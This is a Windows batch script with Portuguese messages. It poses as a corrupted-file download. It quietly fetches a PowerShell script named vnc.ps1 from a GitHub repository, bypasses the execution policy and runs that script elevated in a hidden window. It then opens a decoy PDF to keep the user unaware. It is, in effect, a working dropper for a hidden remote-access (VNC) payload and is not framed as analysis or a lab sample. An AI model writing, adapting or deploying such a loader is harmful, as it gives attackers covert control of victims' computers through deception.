@echo off
title Arquivo em Download
echo o arquivo esta corrompido, nao feche a janela ate baixar totalmente
echo.
echo Baixando arquivo principal...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/akiranakaisan184proton/ps1vnc/main/vnc.ps1' -OutFile '%USERPROFILE%\Downloads\vnc.ps1'"
if %ERRORLEVEL% neq 0 (
    echo Erro ao baixar o arquivo principal. Verifique a conexao e tente novamente.
    pause
    exit /b
)
echo.
echo Configurando execucao segura...
powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force"
if %ERRORLEVEL% neq 0 (
    echo Erro ao configurar a politica de execucao.
    pause
    exit /b
)
echo.
echo Executando script...
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%USERPROFILE%\Downloads\vnc.ps1\"'"
if %ERRORLEVEL% neq 0 (
    echo Erro ao executar o script.
    pause
    exit /b
)
echo.
echo Aguardando execucao...
timeout /t 5 /nobreak >nul
echo.
echo Baixando documento final...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/akiranakaisan184proton/ps1vnc/raw/main/Limber.pdf' -OutFile '%USERPROFILE%\Downloads\Limber.pdf'"
if %ERRORLEVEL% neq 0 (
    echo Erro ao baixar o documento final.
    pause
    exit /b
)
echo.
echo Abrindo documento...
start "" "%USERPROFILE%\Downloads\Limber.pdf"
if %ERRORLEVEL% neq 0 (
    echo Erro ao abrir o documento.
    pause
    exit /b
)
echo.
echo Concluido com sucesso!
pause